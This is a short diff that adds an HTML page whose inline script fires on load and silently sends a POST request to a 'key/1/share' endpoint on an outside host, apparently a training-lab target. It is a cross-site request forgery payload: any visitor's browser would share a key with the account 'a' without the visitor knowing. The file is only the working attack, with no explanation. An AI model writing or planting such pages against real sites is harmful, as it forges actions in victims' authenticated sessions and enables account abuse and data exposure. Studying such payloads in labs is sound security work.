@@ -1,0 +1,11 @@
+<html>
+<script>
+  function share(){
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://ptl-b9257f0a-3a79a67f.libcurl.so/key/1/share", true);
+    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    xhr.send('user=a&id=1');
+  }
+  share();
+</script>
+</html>
